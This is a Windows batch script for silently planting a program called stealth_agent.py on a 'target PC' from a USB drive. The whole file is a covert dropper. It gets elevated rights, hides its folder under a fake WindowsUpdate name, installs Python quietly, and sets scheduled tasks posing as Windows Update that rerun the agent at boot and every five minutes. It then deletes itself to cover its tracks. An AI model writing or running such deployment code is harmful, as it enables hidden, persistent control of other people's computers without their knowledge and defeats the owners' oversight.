@echo off
REM USB Silent Deployment Script
REM Run this from USB drive on target PC

REM Hide command window
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

REM Set variables
set "INSTALL_DIR=%LOCALAPPDATA%\WindowsUpdate"
set "USB_DIR=%~dp0"

REM Create installation directory
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
    attrib +h "%INSTALL_DIR%"
)

REM Copy files from USB
copy "%USB_DIR%stealth_agent.py" "%INSTALL_DIR%\agent.py" >nul
copy "%USB_DIR%config.json" "%INSTALL_DIR%\config.json" >nul
copy "%USB_DIR%requirements.txt" "%INSTALL_DIR%\requirements.txt" >nul

REM Check if Python is installed
python --version >nul 2>&1
if errorlevel 1 (
    REM Install Python silently
    "%USB_DIR%python-installer.exe" /quiet InstallAllUsers=0 PrependPath=1
    timeout /t 30 /nobreak >nul
)

REM Install dependencies
cd /d "%INSTALL_DIR%"
python -m pip install -r requirements.txt --quiet

REM Create scheduled task
schtasks /create /tn "WindowsUpdateService" /tr "python \"%INSTALL_DIR%\agent.py\"" /sc onstart /ru "%USERNAME%" /f >nul
schtasks /create /tn "WindowsUpdateCheck" /tr "python \"%INSTALL_DIR%\agent.py\"" /sc minute /mo 5 /ru "%USERNAME%" /f >nul

REM Start the service
schtasks /run /tn "WindowsUpdateService" >nul

REM Clean up
del "%~f0" >nul 2>&1

exit /b
